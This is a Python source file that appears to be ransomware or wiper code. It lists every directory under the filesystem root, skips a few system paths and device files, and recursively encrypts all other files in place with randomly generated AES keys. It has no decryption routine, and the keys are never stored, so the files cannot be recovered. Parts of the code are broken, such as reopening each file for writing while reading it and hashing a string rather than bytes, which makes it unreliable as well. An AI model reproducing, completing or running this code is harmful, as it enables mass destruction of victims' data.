import os
import subprocess
import sys
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Hash import SHA256
from random import SystemRandom

def encrypt(filepath, key):
    # Generate a random initialization vector
    initialization_vector = Random.new().read(16)
    # Create AES encryptor object
    encryptor = AES.new(key, AES.MODE_CBC, initialization_vector)
    
    # Encrypt the file
    with open(filepath, 'rb') as infile:
        with open(filepath, 'wb') as outfile:
            while True:
                chunk = infile.read(65536)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    # Pad the chunk if its length is not a multiple of 16
                    chunk += b' ' * (16 - (len(chunk) % 16))    
                # Write the encrypted chunk to the output file  
                outfile.write(encryptor.encrypt(chunk))

def load_hue():
    print("Loading Source of HUE ...")
    source = os.urandom(256)
    # Generate random data to load the source
    for i in range(3):
        source += os.urandom(2 ** (21 + i))
        # Update progress
        update_progress((i + 1.0) / 3.0)
    print("\n")
    return source

def update_progress(progress):
    bar_length = 23
    status = "({}%)".format(int(progress * 100))
    if progress >= 1.0:
        progress = 1
        status = "COMPLETE"
    block = int(round(bar_length * progress))
    # Display progress
    text = "\r{0}\t\t{1}".format("#" * block + "-" * (bar_length - block), status)
    sys.stdout.write(text)
    sys.stdout.flush()

def generate_keys(source):
    print("Generating Keys ...")
    keys = []
    for i in range(9):
        # Generate keys using SHA256 hashing algorithm
        keys.append(SHA256.new(''.join(SystemRandom().choice(source) for _ in range(SystemRandom().randint(128, 256)) for _ in range(SystemRandom().randint(128, 256)))).digest())
        if i % 3 == 0:
            # Update progress
            update_progress((i + 1.0) / 3.0)
    print("\n")
    return keys

def locate_files():
    print("Locating target files ...")
    # Get the list of directories in the root directory
    targets = next(os.walk('/'))[1]
    # Remove system directories
    for core in ('proc', 'sys', 'lib', 'run'):
        if core in targets:
            targets.remove(core)
    return targets

def encrypt_dir(directory, key):
    # Recursively encrypt files in a directory
    root, directories, files = next(os.walk(directory))
    # Encrypt files in the current directory
    if files:
        for file in files:
            path = os.path.join(root, file)
            try:
                # Check if the file is not a system device      
                if '/dev' in path[:4] and not any(substring in path for substring in ('sg', 'fd', 'char', 'by-u', 'pts', 'cpu', 'mapper', 'input', 'bus', 'disk')):
                    if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg', 'hidraw', 'psaux', 'ptmx', 'console', 'random', 'zero', 'mem', 'rfkill', 'card', 'control', 'pcm', 'seq', 'timer', '-', ':', 'disk', 'block', 'char')):
                        encrypt(path, key)
                else:
                    encrypt(path, key)
            except:
                pass
    # Encrypt files in subdirectories
    if directories:
        for directory in directories:
            encrypt_dir(os.path.join(root, directory), key)
